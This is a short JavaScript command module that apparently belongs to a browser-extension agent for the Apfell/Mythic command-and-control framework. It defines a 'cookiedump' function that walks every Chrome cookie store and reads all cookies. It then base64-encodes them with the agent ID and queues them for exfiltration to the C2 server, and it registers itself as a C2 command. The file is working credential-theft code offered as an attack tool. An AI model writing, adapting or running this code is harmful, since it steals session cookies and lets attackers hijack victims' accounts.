cookiedump = function(task) {
    let results = [];
    chrome.cookies.getAllCookieStores(function(stores) {
        stores.forEach(function (store) {
            const filter = {};
            filter["storeId"] = store.id;
            chrome.cookies.getAll({"storeId": store.id}, function (cookies) {
                response = {'task_id':task['task_id'], 'user_output':JSON.stringify(cookies, null, 2), 'completed':true};
                outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
                enc = JSON.stringify(outer_response);
                final = apfell.apfellid + enc;
                msg = btoa(unescape(encodeURIComponent(final)));
                out.push(msg);
            });
        });
    });
};

C2.commands[cookiedump.name] = cookiedump;
COMMAND_ENDS_HERE
